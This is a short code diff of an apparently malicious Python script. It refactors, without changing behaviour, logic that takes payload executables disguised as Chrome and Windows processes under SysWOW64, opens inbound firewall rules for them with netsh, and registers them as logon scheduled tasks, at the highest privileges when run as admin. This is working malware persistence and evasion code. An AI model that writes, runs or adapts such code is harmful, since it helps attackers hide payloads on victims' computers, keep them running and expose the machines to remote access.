@@ -35,20 +35,25 @@ nsis_path = {'chrome':'Google',
         'MSASTUIL' : 'WSEC',
         'WmiPrvSE' : 'WMIP'}
 
-for key in nsis_path:
-    inst_dir = "C:\\Windows\\SysWOW64\\"
-    pld_exe = '{}.exe'.format(key)
-    pld_nsis = nsis_path[key]
+inst_dir = "C:\\Windows\\SysWOW64\\"
+for key, pld_nsis in nsis_path.items():
+    pld_exe = f'{key}.exe'
     pld_path = os.path.join(inst_dir,pld_nsis)
     pld_exe_path = os.path.join(pld_path,pld_exe)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 
     if os.path.exists(pld_exe_path):
-        run_command('netsh advfirewall firewall add rule name="{}" dir=in action=allow program="{}" enable=yes'.format(key,pld_exe_path))
+        run_command(
+            f'netsh advfirewall firewall add rule name="{key}" dir=in action=allow program="{pld_exe_path}" enable=yes'
+        )
+
         if is_admin:
-            run_command('schtasks /create /sc onlogon /tn {}_st /rl highest /tr "{}"'.format(key,pld_exe_path))
+            run_command(
+                f'schtasks /create /sc onlogon /tn {key}_st /rl highest /tr "{pld_exe_path}"'
+            )
+
         else:
-            run_command('schtasks /create /sc onlogon /tn {}_st /tr "{}"'.format(key,pld_exe_path))
+            run_command(f'schtasks /create /sc onlogon /tn {key}_st /tr "{pld_exe_path}"')
 
     if os.path.exists('C:\\Windows\\regedit.exe'):
         infofile = 'C:\\Windows\\regedit.exe'
